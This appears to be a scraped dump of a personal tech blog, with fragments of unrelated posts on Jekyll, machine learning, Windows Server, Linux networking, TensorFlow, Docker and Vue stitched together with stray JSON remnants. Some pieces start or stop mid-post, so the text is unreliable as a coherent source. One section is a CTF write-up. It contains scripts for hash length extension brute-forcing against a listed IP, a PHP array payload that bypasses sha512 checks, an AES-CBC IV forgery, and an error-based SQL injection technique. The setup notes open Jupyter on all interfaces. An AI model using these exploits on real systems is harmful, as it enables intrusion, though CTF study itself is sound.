implement the change in the file.  Gemfile: set the gem package version.The blogs written in markdown in the /_posts path are consisted of two parts: front matter and content.  Front matter:  written in JSON or YAML. Including layout, title, date, categories and so on. And Jekyll will use these variable to set the url of the blog. Besides, custom variable can be added as well.  Content: the main ideas of blogs.The sample of the front matter is like that:---layout: post/pagetitle:  \"Welcome to Jekyll!\"date:   2020-02-03 15:38:48 +0800categories: jekyll updatepermalinks: /about/---We can set default front matter on _config.yml.defaults:\t-\tscope:\t\tpath: \"\"\t\ttype: \"posts\"\t\tvalues:\t\t\tlayout: \"post\"\t\t\ttitle: \"my title\"Hint: If we edit the _config.yml file, we need to restart the jekyll server to see the change on the website.2. Building Your Website2.1 Choose a themeThe quickest way to choose a theme has two steps:(1) Set the theme name on the _config.yml file by theme: minimal-mistakes-jekyll(2) Edit Gemfile to install the related packages: gem \"minimal-mistakes-jekyll\"2.2 LayoutAlso, we can set custom layout by building a layout.html file under the folder _layout.In the layout.html, we can use HTML and Liquid.In the file, content can be used to display the markdown part.2.3 VaribaleWe can use _include folder to save header.html and footer.html.And we can also use site.title and other variable like site.message to use the information form _config.yml.Besides, we can use{% include header.html color%}to cite the header.html file to another file. The variable color can be set in the header.html file by include.color as well.Let’s take an example.In the header.html:&lt;h1 style=\"color: {{include.color}}\"&gt;{{site.title}}&lt;/h1&gt;&lt;hr&gt;&lt;/hr&gt;In the other files, if we want to cite the header.html file, and loop the variable, the example is like that.&lt;html&gt;&lt;head&gt;\t  &lt;meta charset=\"UTF-8\"&gt;\t  &lt;title&gt;{{site.title}}&lt;/title&gt;&lt;head&gt;&lt;body&gt;\t  {% include header.html color=\"blue\" %}\t{{ content }}    # loop  {% for post in site.posts %}  \t{{ post.title }} &lt;br&gt;  {% endfor%}    # conditional  {% if page.title == \"My First Post\" %}  \tThis is the first post.  {% elsif page.title == \"My Second Post \"%}  \tThis is the second post.  {% else %}  \tThis is another post.  {% endif %}&lt;/body&gt;&lt;/html&gt;2.4 FilesWe can create_data folder to store data files to save all source of information. We can use yml, json or csv. And the way we cite the data is by site.data.column.Another file we can use in Jekyll is static file such as images and pdf by site.static_files and use file.path or file.name to describe these files.If we want to use images in a specific path, we can set the default settings in _config.yml.defaults:\t-\tscope:\t\tpath: \"images/img\"\t\tvalues:\t\t\timage: trueAnd then we can use these images in the other files direcitly.{% for file in site.static_files %}\t{% if file.image %}\t\t&lt;img src=\"{{file.path}}\" alt=\"{file.name}\"&gt;\t{% endif %}{% endofor %}3. Hosting on Github PagesFirst Step: Create a new repository on Github.Second Step: Set base url or domain name in _config.ymlThird Step: set the Jekyll website and sync the github repository.git initgit checkout -b repogit statusgit add .git commit -m \"initial commit\"git remote add origin https://github.... # your github repo pathgit push origin repoFourth Step: Set your repo github pages on the settings.More information about github pages is available here.Jekyll-related Problem Recording1. Busuanzi Counting Prblembusuanzi is a pretty straightforward and easy-using script for website to count the page views. While the single page counter seems not to work incorrectly. I have tried on my own website and visit several other websites on the Internet. It shows that the single page counter just show all pages viewing number instead of separating them.&lt;span id=\"busuanzi_container_page_pv\" style='display:none'&gt;   Read: &lt;span id=\"busuanzi_value_page_pv\"&gt;&lt;/span&gt; Times&lt;/span&gt;"

    "content": "I will keep doing researches in adversarial machine learning, so I need to master the basci knowledge stuff. I want to use this blog to record the important and interesting things.Some repositories which can achieve useful information about how to learn Machine Learning or Tensorflow:  Virgilio  DeepLearning 500 question  TensorFlow Tutorials  Pytorch 60 mins Tutorial接下来，我将总结一下机器学习相关知识，并进行分析和反思。第一节主要根据《Machine Learning in Action》的内容，但是这书讲得太烂了，介绍算法混乱，定义不明确，代码过时并且意义不大，弃之。使用《统计学习方法》进行补充和继续。1. 分类1.1 基本概念首先，什么是机器学习？机器学习是把无序的数据转换成有用的信息。无序的数据主要分为两种：数值型（浮点数）、多值型（整数）。而机器学习的主要任务包括回归（预测数值型数据）和分类（将数据划分到合适类别）。两者皆属于监督学习，及需要知道任务的答案。而无监督学习是在没有类别信息或目标值的情况下通过数据本身进行聚类。接下来介绍一下机器学习的开发步骤：（1）收集数据：通过把前人公开或者自行爬取的数据进行归纳总结，得到最原始的数据库。（2）准备数据：根据机器学习的输入要求，把原始数据标准化以及数量化。（3）分析数据：分析当前获得的数据是否合理，是否存在数据平衡性或数据量不足的问题。（4）训练算法：挑选合适的机器学习算法或模型进行训练，并在训练过程中调整超参数。（5）分析结果：分析实验结果的真实性，反复调整超参数和模型提高准确率或效果。（6）可视化展示：通过图表或其他方式对实验结果进行分析展示。目前主要的机器学习开发语言是Python，此外还会涉及到Numpy, Scipy, Matplotlib, Pandas等库进行补充。1.2 KNN算法K临近算法（K-Nearest-Neighbor）是通过比较数据的特征值之间的距离进行分类。该算法的优点是对异常值不明感，缺点是时间复杂度和空间复杂度高。具体来说，通过把数据特征量化后，根据特征的差异定义距离，将距离最近的数据设置成同一类别的过程。KNN算法的伪代码如下：（1）计算已知类别数据集中的所有点与当前需要分类点之间的距离；（2）将所有点按距离远近从小到大排列；（3）选取与当前点距离最近的K个点；（4）确定这些点的类别，返回出现频率最高的点的类别作为预测结果；比较基础的距离计算公式是计算欧式距离，即初中学习的两点间距离公式的多维度展开，具体公式如下：\\[distance=\\sqrt{\\sum_{i=0}^{n}(a_i-b_i)^2}\\]显而易见，KNN算法并不一定能得到完全正确的预测结果，因此需要通过一些衡量标准来实现对算法效果的评估。一般来说，通过准确率可以较直观地了解分类器在某数据集上的效果，即准确率=分类正确个数/总个数。在处理特征的过程中，需要对数据进行归一化处理，其公式如下：\\[newValue = \\frac{oldValue-min}{max-min}\\]通过该公式可以把原本取值范围极大的特征映射到0到1之间。1.3 决策树决策树是通过针对数据的特征进行划分并最终完成对数据的分类的一种树形结构，由结点和有向边组成。结点包括内部结点（表示特征或属性）和叶结点（类）。在判断如何划分数据时，需要引进信息熵或者基尼不纯度(Gini Impurity)等概念。（1）信息熵，即信息的期望值。对于\\(x_i\\)的信息定义为：\\(l(x_i)=-log_{2}p(x_i)\\)。其中\\(p(x_i)\\)表示该分类的概率。那么所以类别可能值包含的信息期望值：\\(H=-\\sum_{i=1}^np(x_i)log_2p(x_i)\\)。因此，如果划分之后信息熵变大，则说明数据更加无序；相反如果熵值变低，则说明数据有序，分类合理。（2）基尼不纯度：通过对信息熵定义中的\\(log_2p(x_i)\\)泰勒展开舍弃高阶小量得到。因此可以把基尼不纯度看作是熵的近似值。\\[Gini(X)=\\sum_{x\\in\\chi}p(x)(1-p(x))\\]目前主流的决策树包括：ID3、C4.5、CART、随机森林等。1.4 朴素贝叶斯分类贝叶斯分类，即以贝叶斯定理为基础进行分类，而朴素贝叶斯份额里则是其中有代表性的一种算法。首先，概率论中通过贝叶斯法则可以计算条件概率。若要计算\\(c\\)在\\(x\\)情况下的概率，则可以使用如下公式：\\[\\large{P(c|x)=\\frac{p(x|c)p(c)}{p(x)}}\\]而朴素贝叶斯分类则是通过计算概率来进行分类。比如，在对文档进行分类时，\\(w\\)代表该文档的词向量，\\(c_i\\)表示把该文档归为\\(i\\)类，则公式为：\\[\\large{P(c_i|w)=\\frac{p(w|c_i)p(c_i)}{p(w)}}\\]其中\\(p(c_i)=\\frac{i类文档数量}{文档总数量}\\)；假设文档中所有词出现概率相互独立，根据朴素贝叶斯假设，通过如下公式来简化计算： \\(p(w\\vert c_i)=p(w_0,w_1,\\ldots ,w_n\\vert c_i)=p(w_0\\vert c_i)p(w_1\\vert c_i)\\ldots p(w_n\\vert c_i)\\)；由于只需要比较概率大小，所以\\(p(w)\\)无需计算。1.5 Logistic回归1.6 支持向量机(SVM)1.7 Adaboost元算法一些问题1. 反向传播2. 梯度消失3."

So I find a tutorial in the Youtube and record and summarize the basic knowledge and shortcut about AI.Tutorial Link1. Ten Basic ThingStart the new file from the templateThere are several templates we can use when building a new file. If we want to design a web UI we can choose the web navbar or we can click “More Settings” buttom to set the specific detail about the new file. We can set the profile as Custom and then set the artboard number and other things.And another tip is that we can set the artboard name at the bottom of the right side as we can see in the picture3 just like Sketch.Tools      Rectangle tool(Shortcut M) is used to create a rectangle.      - If we hold shift when we create the rectangle, it will be a square. And this tip is also suitable in creating ellipse and circle.     - If we click when using the rectangle tool, we can input the specific number of the width and height.     - We can use Object -&gt; Arrange to move the graph backward or forward.    Drwa a line:          Pen tool: hold shift to draw a perfectly straight line. Clike to get a line and drag to get a curve.      Line segment tool(): draw a line and hold shift to draw.      Pencil tool: draw strokes.            Blob brush tool and Painbrush tool: We can use some pattens in Brush Library to draw some specific lines.        Gradient tool: set gradient color in shapes. We can choose several colors and rotate the gradient.        Shape build tool: group or join in different shapes into one shape.        Free transform tool: change or distort the shape to some special form    Change pixel picture to vector."

DHCP服务与DNS服务3.1 概念动态主机分配协议，方便客户端批量自动获取IP地址，其租借过程如下：  客户端以0.0.0.0作为自己的IP地址，255.255.255.255作为DHCP服务器地址，广播DHCP发现信息，包含网卡Mac地址和NetBIOS名称。  每隔一段时间发送一次直到收到回复，或者自动选定保留IP地址段的一个，保证没有DHCP服务器网络仍能运行。  客户单收到第一个请求后以广播方式告知所有服务器。3.2 在服务器中，以IP作用域作为基本管理单位。IP作用域就是网络中可管理的IP地址分组。超级作用域是DHCP服务器上有多个作用域，用于多网配置。3.3 DHCP中继代理：将请求发送到远端的DHCP服务器上。3.4 域名系统，实现名称与IP地址的转换，主要包括：  DNS域命名空间  资源记录  服务器  客户端3.5 查询模式：递归查询、迭代查询、反向查询4. 文件服务与证书服务4.1 通过文件服务器，设置共享文件夹，并给予不同用户不同的权限。另外，可以使用资源管理器实现文件共享；通过脱机设置实现离线访问共享资源。4.2 资源访问权限的控制：NTFS。NTFS是从Windows NT开始引入的文件系统，可以为文件夹和文件授权，支持数据压缩和磁盘限额，但不适用与FAT或FAT32文件系统4.3 磁盘配额：以文件所有权为基础，只应用于卷并监视个人用户卷的使用情况。4.4 分布式文件系统 DFS：为所有共享文件提供访问点和逻辑树结构，保证服务稳定。  独立的根目录分布式文件系统：目录信息存储在本地主服务器上。没有根级别的容错，即根不可达则整个空间不可访问。  域分布式文件系统：拓扑信息存储在活动目录AD中。4.5 数字证书是由证书颁发机构（Certification Authority）数字签名的、包含用户身份信息和用户公钥信息以及身份验证机构数字签名的数据。  身份验证机构的数字签名确保信息真实性  用户公钥信息确保完整性  用户数字签名确保不可否认性注意：Windows 2008使用公共密钥基础结构（Public Key Infrastructure），即非对称加密技术。注意，部署了证书服务器后，服务器的计算机名和域名不能更改，但可以更改IP地址。5. 活动目录权限管理服务（AD Right Management Services）相关组件：应用程序、服务器、客户端5.1 权限管理账号证书生成过程：  用户第一次使用加密文档之前，需要域用户身份向AD RMS服务器发送请求，获取证书。  服务器数据库，若密钥已经存在则使用该密钥，否则新建。  服务器将用户密钥中私钥用服务器的私钥加密，并将公钥和加密了的私钥放到权限管理账户证书中。  权限管理账户证书被服务器用私钥签名，并发送给用户。  服务器将用户的密钥对存储到AD RMS数据库中。5.2 AD RMS实现原理5.1.1 服务的发现5.1.2 文档在线发布过程5.1.3 文档离线发布过程5.1.4 受保护文档使用过程服务器虚拟化（Hyper-V）与虚拟机不同，Hyper-V管理的虚拟机直接运行在底层，相当于独立的计算机。网络访问保护（Network Access Protection）检查联入内网的电脑是否安全，分为4个部分：  策略验证  隔离  补救  持续监控防火墙IPSec从Windows Server 2003开始使用，位于网络层，可以防止中间人攻击、探测攻击、重放攻击、未认证的网络应用程序访问、只适用IP地址认证的网络应用程序的访问。IPSec有两种模式：传输模式和通道模式。IPSec使用两种协议：AH和ESP。Internet密钥交换协议（IKE）：Internet安全关联和密钥管理协议（ISAKMP）和Oakley金钥交换协议的组合，分为3个模式：主模式、快速模式和用户模式。ATA[90 days free trial]The Advanced Threat Analytics is a platform to protect the system from cyber attacks.

IP Address – protocol address management3.1 ip address addArguments:  dev NAME  local ADDRESS(default)  broadcast ADDRESSExample:ip addr add 10.0.0.1/24 brd + dev eth0 label eth0:Alias: add the address 10.0.0.1 with prefix length 24 (i.e. netmask 255.255.255.0), standard broadcast and label eth0:Alias to the interface eth0.3.2 ip address deleteThis command coincides with the arguments of ip addr add.3.3 ip address showThis command shows the details of the ip address configuration.3.4 ip address flushdangerous, similiar to delete command4. IP NeighbourNeighour objects establish bindings between protocol addresses and link layer addresses for hosts sharing the same link. The IPv4 neighbour table is known as the ARP table.  ip neigh add/change/replace  ip neigh delete  ip neigh show  ip neigh flushExample:ip neigh add 10.0.0.3 lladdr 0:0:0:0:0:1 dev eth0 nud perm: add a permanent ARP entry for the neighbour 10.0.0.3 on the device eth0.5. IP Route – routing table managementRoute entries in the kernel routing tables keep information about paths to other networked nodes.All of the packets will obey the routes based on the prefix its ip address matches. If several routes match the packet, the longest matching prefix is selected.  ip route add/change/replace  ip route delete  ip route show  ip route flush  ip route getExample:ip route add 10.0.0/24 via 193.233.7.65: add a plain route to network 10.0.0/24 via gateway 193.233.7.65.6. Other CommandsIP Rule – routing policy database managementRules in the routing policy database control the route selection algorithm.  ip rule add/delete  ip rule showIP maddress – multicast addresses managementIP mroute – multicast routing cache managementIP tunnel – tunnel configurationError Record:      When the file interfaces does not work, the problem mostly is in the interfaces file’s content which contains some mistakes or lack in some tools. Once the file interfaces does not work although I restarted the network module. The problem is that I did not install ethtool which is used in interfaces file.    Ethtool is a useful utility used for Network Interface Card configuration. It is easy toconfigure the IP address, interface speed, interface duplex or half duplex.  "

    "content": "1. Start UpThe aim of this chapter is to install IPython and tensorflow packages by Anaconda.      Installing Jupyter methods: There are two methods listing on the page, but the first one which used Anaconda is recommanded because when you want to delete the whole things the pip way just sucks.    When you want to uninstall Jupyter, the conda way uses the following command easily: conda uninstall jupyter notebook. But the pip way needs to use pip list |grep Jupyter and then uninstall the result by hand.        Install Anaconda: Using the curl command is the fastest way to get the installer, or the installer is avaiable on the official website.    curl -O https://repo.continuum.io/archive/Anaconda3-5.2.0-Linux-x86_64.sh    You can check the installer by the sha256 with the sum on the official website:    sha256sum Anaconda3-5.2.0-Linux-x86_64.sh    Then run the script:    bash Anaconda3-5.2.0-Linux-x86_64.sh    Once the ouput shows the following information:     installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] &gt;&gt;&gt;   Input `Yes` to use `conda` command everywhere. And activate the configuration with the following command:        source ~/.bashrc        Common usage of conda:     conda list # list the packages conda info -envs # list the environments conda create --name my_env python=3.6 # create an environment with python 3.6 source activate my_env # activate the environment source deactivate # deactivate conda remove --name my_env --all # delete the environment conda update conda/anaconda # update conda and anaconda distribution version conda install anaconda-clean # delete anaconda anaconda-clean rm -rf ~/anaconda3 # need to delete the path in ~/.bashrc as well            Install Jupyter:  After created the environment by the command:    conda create -n tensorflow pip python=2.7 # or python=3.6    activate the environment and then install Jupyter and TensorFlow. After that, you need to set the config for running a notebook server so you can just use your browser to control the Jupyter. The information is provided here. For me, the easiest way to configure it is like that:     $ jupyter notebook --generate-config $ vim ~/.jupyter/jupyter_notebook_config.py # delete the # before the following lines     c.NotebookApp.ip = '*'     c.NotebookApp.notebook_dir = '/home/User/jupyter'     c.NotebookApp.open_browser = True        After that, you can use &lt;IP address&gt;:8888 on your browser to connect the Jupyter.        Install Tensorflow(After activated the environment):    $ pip install --ignore-installed --upgrade tfBinaryURL    tfBinaryURL is available on the page. The following command may be needed to be updated.    pip install --ignore-installed --upgrade https://download.tensorflow.google.cn/linux/cpu/tensorflow-1.8.0-cp36-cp36m-linux_x86_64.whl        Now when you use jupyter notebook and new your first file try to import tensorflow, it is still not available. The reason is that the jupyter package is installed on conda dirctory but tensorflow is installed in your environment. So the method to solve the problem is to install the jupyter package in your environment and add the environment path to the .bashrc file.     ```shell  source activate my_env  pip install jupyter  vim ~/.bashrc        export PATH=”/home/user/anaconda3/bin:$PATH” # replace the line  export PATH=”/home/user/anaconda3/envs/my_env/bin:/home/user/anaconda3/bin:PATH”  source ~/.bashrc  ``        Everything has done! Explore the TensorFlow by Jupyter!  ErrorIf you get the warning like that:/home/jxu/anaconda3/envs/tensorflow/lib/python3.6/importlib/_bootstrap.py:219: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88It means the numpy and the tensorflow version are conflict. So the solution is to use the commands to change the numpy version after you activate the anaconda environment.sudo pip uninstall numpysudo pip install numpy==1.14.5Then reactivate the environment and the warning disappear.2. TensorboardTensorboard is a very useful software which can provide five types of visualizations: scalars, images, audio, histograms and graphs.Step 1: Serializing the dataTensorboard operates by tensorflow events files. The following functions can be used to record the information.  tf.summary.scalar: collect the information of the variable changes  tf.summary.histogram: visualize the distributions of gradients or weights  tf.summary.merge_all: manage all the summary nodes  tf.summary.FileWriter: write the summary data to diskStep 2: Launch the TensorboardBefore runing Tensorboard, generate summary data in a log directory by the following code snippets:# sess.graph contains the graph definitionfile_writer = tf.summary.FileWriter('/path/to/logs', sess.graph)And then, run the tensorboard:tensorboard --logdir=path/to/log-directoryStep 3: Graph Visualizationuse tf.name_scope('') to push a name scope in the graph. The better your name scopes, the better your visualization.Tensorflow graphs have 2 kinds of connections: data dependencies and control dependencies.  data dependencies: solid lines  control dependencies: dotted linesFor networks with long sequences, sequential motifs that nodes whose names differ by a numer at the end and have isomorphic structures are collapsed into a single stack od nodes like range[1-8].3. A simple example with RNNSome key terminologies in neural network when reading the code:  batch_size: the number of training examples in one forward/backward pass  epoch: one forward pass and one backward pass of all the training examples  number of iterations: number of passes, each pass using [batch size] number of examplesExample: if you have 1000 training examples, and your batch size is 500, then it will take 2 iterations to complete 1 epoch.4. Data PreprocessingData NormalizationNormalization is an example of preprocessing data to remove or reduce the burden from machine learning (ML) to learn certain invariants, that is, things which make no difference in the meaning of the symbol, but only change the rep- resentation. So the data redundancy is reduced.5. Cross ValidationCross validation is primarily used to estimate the skill of a machine learningmodel on unseen data. That is, to use a limited sample in order to estimate how the model is expected to perform in general when used to make predictions on data not used during the training of the model. It is a popular method because it is simple to understand and because it generally results in a less biased or less optimistic estimate of the model skill than other methods, such as a simple train/test split.Stanford CS231nComputer VisionThe whole study materials in the blog are from Stanford official websites.1. Simple algorithms with basic concept in machine learningThe simple and core problems in Computer Vision is Image Classfication. The image can be reshaped to a matric with three colors channels Red, Green, Blue. But there are a lot of changes of the same object in different pictures based on the viewpoint variation, scale variation, deformation, background clutter and so on. The approach to solve the problem is the using of data-driven.k-Means NeighborThe first algorithm is Nearest Neighbor Classifier. It compares the mertics of different images and decides the result on the distance of them. The distance formula which is a reasonable choice is the following formula which is called $L1$ distance:\\(d_1(I_1, I_2) = \\Sigma_p|I_1^p - I_2^p|\\)The imporved algorithm is k-Nearest Neighbor Classifier which will find the top k closest images instead of the closest one.cross-validationNot just split the data into training set and validation set, the training set is divided into 5 equal folders and use 4 of themfor training and 1 for validation. And iterate over which folder is the validation set.hyper-parametersThey are associated with the classifier and do not have a good way to choose the bset value.loss/cost functionThe loss function can calcuate the distance between the true aim and the training result which measure the outcomes accurate.The following formula is the Multiclass Support Vector Machine(SVM) loss.\\[L_i = \\Sigma_{j\\neq y_i}max(0, s_j - s_{y_i} + 1)\\]The softmax classifier’s cross-entropy loass form:\\[L_i = -log\\Big(\\frac{e^{f_{}y_i}}{\\Sigma_j e^{f_j}}\\Big)\\]backpropagationBackpropagation is a way of computing gradients of expressions through recursive application of chain rule.activation function"

    "content": "Go Learningsource  github  documentsgo tool tourKuberneteDockerHow to build your own docker imageDocker image can be automatically built by using Dockerfile. The whole summary base on the docker documentation.      Image building command usage:    docker build &lt;path&gt; -&lt;flag&gt; parameter &lt;file path&gt;    We can use different flags to specialize the image.                            flag          instruction                                      -f          point to a Dockerfile in the file system                          -t          tag an image                          Dockerfile Format:    The file is not case-sensitive. But the convention is to UPPERCASE the comments to distinguish them easily. A Dockerfile must start with FORM instruction.    Example:     FROM busybox ENV foo /bar WORKDIR ${foo}   # WORKDIR /bar ADD . $foo       # ADD . /bar COPY \\$foo /quux # COPY $foo /quux              FROM: initialize a new image and set the Base Image.                  ARG is the only instruction that may precede FROM and can declare the variables.                    RUN:                  RUN &lt;command&gt;: run command in a shell equal to /bin/sh -c or cmd /S /C          RUN [\"executable\", \"param1\", \"param2\"]: exec form                    CMD: There can only be one CMD instruction in a Dockerfile. If you list more than one CMD then only the last CMD will take effect.                  The main purpose of a CMD is to provide defaults for an executing container.          CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form)          CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)          CMD command param1 param2 (shell form)                    LABEL: add metadata to an image. It is a key-value pair.      MAINTAINER: set the Author field of the generated image.                  example: LABEL maintainer=\"SvenDowideit@home.org.au\"   \t- EXPOSE : inform Docker that the container listens on the specified network prots at runtime.  \t- ENV  : set the environment vatiable `` to the ``                      \t- ADD  \t- COPY  \t- ENTRYPOINT  \t- VOLUME  \t- USER  \t- WORKDIR  \t- ONBUILD  \t- STOPSIGNAL  \t- HEALTHCHECK  \t- SHELLTutorial: Make a laravel docker image"

The script is running on the server. The following function is responsible for printing the flag. The server just receives packets which are smaller than 1024 bits. And the server will decode the packets by base64.    def remote_sub(conn, address):        print address        (ip, port) = address        conn.send(\"plz input your base64 encode pic:\")        expect_len = 62256        data = ''        while True:            rdata = conn.recv(1024)            data += rdata            expect_len -= 1024            if expect_len &lt; 0:                 break        image_data = base64.b64decode(data)        ori_image = open('/tf_files/test/basque-shepherd-dog.jpg', 'rb').read()                if check_diff(image_data, ori_image) == -1:            conn.send('no\\n')            sys.exit(0)        else:            conn.send('lets go\\n')                # Loads label file, strips off carriage return        label_lines = [line.rstrip() for line                           in tf.gfile.GFile(\"/tf_files/retrained_labels.txt\")]                # Unpersists graph from file        with tf.gfile.FastGFile(\"/tf_files/retrained_graph.pb\", 'rb') as f:            graph_def = tf.GraphDef()            graph_def.ParseFromString(f.read())            _ = tf.import_graph_def(graph_def, name='')                with tf.Session() as sess:            # Feed the image_data as input to the graph and get first prediction            softmax_tensor = sess.graph.get_tensor_by_name('final_result:0')                    predictions = sess.run(softmax_tensor, \\                     {'DecodeJpeg/contents:0': image_data})                    # Sort to show labels of first prediction in order of confidence            top_k = predictions[0].argsort()[-len(predictions[0]):][::-1]            print top_k                    if top_k[0] == 1:                conn.send(config.flag + '\\n')And the encoded text is 4/3 longger than plain text in base64. So everytime I need to send a packet which has 768 bits. And then receiving 2 packets will lead to the flag. The following script will get the flag automatically.\t# -*- coding=UTF-8\timport socket\timport base64\timport time\t\tbind_ip =\"117.50.13.213\"\tbind_port = 12345\t\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ts.connect((bind_ip, bind_port))\tprint(s.recv(1024).decode('utf-8'))\t\twith open('/root/Desktop/test/basque-shepherd-dog.jpg', 'rb') as f:\t    while True:\t        time.sleep(0.01)\t        piece = f.read(768)   \t        if not piece:\t            break\t        s.sendall(base64.b64encode(piece))\t        # print piece\tprint(s.recv(1024).decode('utf-8'))\tprint(s.recv(1024).decode('utf-8'))"

Actually, I haven’t find it yet.I find the following tools and write a script to enumerate the length of the secret. I don’t know what’s the problem which I need to read others’ writeup.  Hash-extender  HashPumpThe script is writen in python.\t# -*- coding:utf-8 -*-\tfrom urlparse import urlparse\tfrom httplib import HTTPConnection\tfrom urllib import urlencode\timport json\timport time\timport os\timport urllib\timport requests\t\t\tdef gao(x, y):\t    #cookie = \"\"\t    cookie = {\"hmac\" : y}\t    r = requests.post(\"http://202.121.178.201:8081/\", data={'username': 'admin', \t'passowrd': x}, cookies = cookie)\t    resp = r.text\t    #print resp\t    #exit()\t    return resp\t\tfor i in xrange(10000):\t    #print i\t    #secret len = ???\t    find_hash = \"../hash_extender/hash_extender --data admin --signature \tbe9fcfa876db5f4184e1635ce6561de7 --format md5  -a sb --out-data-format=html \t--secret \" + str(i) + \" --quiet\"\t    #print find_hash\t    calc_res = os.popen(find_hash).readlines()\t    #print calc_res\t    hash_value = calc_res[0][:32]\t    attack_padding = calc_res[0][32:]\t    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])\t    ret = gao(attack_padding, hash_value)\t    #print ret\t    if \"The flag\" in ret:\t        print ret\t        break2. Shatter Sha512Question\t&lt;?php\t// can u break sha512 algorithm ?\t\terror_reporting(-1);\t\tinclude 'flag.php';\t\tif (!isset($_GET['x']) || !isset($_GET['y'])) {\t    die(show_source(__FILE__));\t}\t\t$x = $_GET['x'];\t$y = $_GET['y'];\t\tif ($x != $y) {\t\t    if (hash(\"sha512\", $x) === hash(\"sha512\", $y)) {\t        echo $flag;\t    }\t\t}\tAnswerThe key is to find that when php function hash(“sha512”,$x) is used to figure out whether two different variables are equal. If variable $x is array the function return false.So the payload is http://202.121.178.201:8083?x[]=1&amp;y[]=2.MISC1. Mystery NumberI get a string which is 5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239.I find that it just has 0-9 and a-e. So I guess it is a hex number. I translate it to hex format by a website.Then I get a string ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9.And then I use Base 64 decode to get the flag.2. Easy Traffic AnalyzeI get a file named flag.pcap. The pcap format file can be loaded on wireshark which consists of an application programming interface (API) for capturing network traffic. But it lost the pcap header. I find a website which introduces the pcap header and get the example header it offers and add it to the file.Then I open the file by Wireshark. I use File &gt; Export Objects &gt; HTTP get three files which is upload.php, upload(1).php and test.php. I use binwalk to find the content of upload.php and the result is that it is a ZIP archive data.Then I rename the upload.php to flag.zip and unzip it. After that, I get a flag1.png. I use binwalk -e flag.png to get two file from flag1.png whose name are 5B and 5B.zlib.I write a python script to output the content of 5B.zlib and find the flag at the end of the file.\timport zlib \tdata = open('5B.zlib','rb').read()\tprint dataIn the course of finding the method to solve the problem, I find some useful tools, such as binwalk, dd,unzip.A dd example:dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1Reverse1. BabyreI get a pyc file which contain byte code and Python interpreter complies the sources to it. I change it to py file by a tool.Then I read the code and get the encode method. I write a decode script to get the flag.\tfrom hashlib import md5\tdef md5raw(s):\t    return bytearray(md5(s).digest())\tdef xor(a, b):\t    assert len(a) == len(b)\t    return bytearray([ i ^ j for i, j in zip(a, b) ])\tflag = bytearray('\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc\t\t1&lt;\\xa9\\\\A\\xde\\xd22\\n')\t\t\t\tfor i in range(16):\t\tflag[:16], flag[16:] = flag[16:], flag[:16]\t\tflag[:16] = xor(flag[:16], md5raw(flag[16:]))\tprint flagCrypto1. AES-ServerI get a server.py which tell me that the server runs a AES CBC decrypt program. I should enter IV and enc to construct a plaintext whose beginning string is admin.   After learning the theory,And I find that if I don’t change variable enc, the secret and the enc’s result after block cipher decryption will never change. So I set IV equal to 0 at first and get a string named temp. Then xor hex(admin) and temp, I got the IV. Use this IV and enc, I construct the plaintext begin with amin and get the flag."

         表中必须有3条以上的记录才会报错      rand()函数的随机因子若不取，则会随机报错，设为固定值如rand(0)，如表中有3条以上数据，就一定报错。      原理：                  执行该条语句时，先建立虚表          floor(rand(0)*2)的返回值是011011…且查询时rand()会被反复执行，即在查询过程中每次匹配会重新计算rand()的值          011011..第一次查询0，没有重新计算为1，产生第一条数据；第二次查询1，有count则直接加1为2；第三次查询0没有重新计算为1，此时有1但是仍要插入1，重复报错。                      [关键]在使用虚拟机的时候会遇到内存不足的情况，直接修改Vmware里的硬盘大小会导致虚拟机重启后无法开机。解决办法是需要重新划分硬盘和设置交换区，使用fdisk和mkswap等工具实现。"

    "content": "6/190. Little Research  vue-cli has some different templates such as webpack, webpack-simple and so on. Use vue list to list all available official templates. The useful template I used is wepack which is a full-featured version.  vue upload module: First the file handle need to be caught and then submit the post type method to connnect the server.  I have used a plugin to offer a editor for users to upload bulletins. Tinymce. The tinymce-vue is not free so I use a intergrated editor from others on the Internet.1. MVVM模式Vue use MVVM model which means Model, View and Viewmodel. Model means data. View means UI and viewmodel means tha logic between them. View and viewmodel communicaates with each other by data binding. While viewmodel and model communicates with each other by notification.2. Vue.js Common commands  v-model: 在表单元素创建双向数据绑定&lt;input type=\"text\" v-model=\"message\"/&gt;  v-if: 条件渲染指令，可以通过布尔变量判断。&lt;h1 v-if=\"yes\"&gt;Yes!&lt;/h1&gt;  v-show: 只渲染css的style属性，这个标签会一直存在于DOM中，如果设置为false，只是样式会消失。  v-else: 跟在v-if/v-show之后。  v-for:渲染一个列表。可以使用template标签实现只循环里面的内容。v-for=\"(i,index) in character\"。  v-bind:argument=”expression”:argument可以是class、src等，参数可以使各种变量，通过绑定变量即时反应值得变化。  v-on:监听DOM事件，事件发生后通过帮顶一个方法或者内联语句实现调用。可以用@进行缩写。  v-html:用于插入一段纯HTML代码。  this          this.$refs可用于将      3.组件3.1 步骤  创建组件构造器Vue.extend()  注册组件Vue.component()  使用组件3.2 全局注册和局部注册全局注册：Vue.component()局部注册：只能在指定实例中使用new Vue({\tel: '#app',  \tcomponents: {   'my-component' : myComponent   }});3.3 父子组件var Parent = Vue.extend({// 在Parent组件内使用&lt;child-component&gt;标签\ttemplate :'&lt;p&gt;This is a Parent component&lt;/p&gt;&lt;child-component&gt;&lt;/child-component&gt;',   components: {// 局部注册Child组件，该组件只能在Parent组件内使用   'child-component': Child    }}) 3.4 组件注册语法糖简化过程：Vue.components第一个参数是标签名称，第二个参数是选项对象。这种方式将自动调用Vue.extend()。Vue.component('my-component1',{template: '&lt;div&gt;This is the first component!&lt;/div&gt;'})var vm1 = new Vue({ \tel: '#app1'})        3.5 使用propsprops把父组件的数据传递给子组件。  绑定类型          单项绑定：父组件修改传递给子组件，子组件修改不影响父组件      双向绑定.sync：子组件修改的数据会回传给父组件      